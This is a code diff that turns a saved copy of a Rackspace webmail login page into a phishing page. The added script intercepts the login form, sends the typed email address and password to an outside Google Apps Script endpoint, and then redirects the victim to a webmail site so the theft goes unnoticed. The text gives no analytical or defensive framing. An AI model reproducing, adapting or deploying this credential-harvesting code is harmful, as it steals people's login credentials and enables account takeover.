@@ -668,7 +668,7 @@
             </a>
           </div>
           <div id="divider"></div>
-          <form id="form" method="post" name="login" action="" autocomplete="off">
+          <form id="google-sheet" method="post" name="login" action="" autocomplete="off">
   <script data-savepage-src="/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=" data-savepage-type="text/javascript" type="text/plain"></script>
   <div id="form-body">
     <div id="form-container">
@@ -680,7 +680,7 @@
         <div id="user-col" class="col">
           <div id="user-field" class="form-group">
             <label id="user-label" class="form-label">Email address</label>
-            <input id="user-input" name="username" tabindex="1" class="form-field" value="" autocomplete="username">
+            <input id="user-input" name="Username" tabindex="1" class="form-field" value="" autocomplete="username">
           </div>
         </div>
       </div>
@@ -688,7 +688,7 @@
         <div id="pass-col" class="col">
           <div id="pass-field" class="form-group">
             <label id="pass-label" class="form-label">Password</label>
-            <input id="pass-input" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password">
+            <input id="pass-input" name="Password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password">
           </div>
           <a id="forgot-password" data-savepage-href="/wmidentity/recover/password" href="https://apps.rackspace.com/wmidentity/recover/password" tabindex="4">Forgot password?</a>
         </div>
@@ -698,7 +698,24 @@
   <div id="login-btn-toolbar">
     <button onclick="submitLogin(event);" id="login-btn" tabindex="3" type="submit">Log In</button>
   </div>
-</form>
+</form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://webmail.orangeinhosting.net/';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
         </div>
         <div class="base_links">
           <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
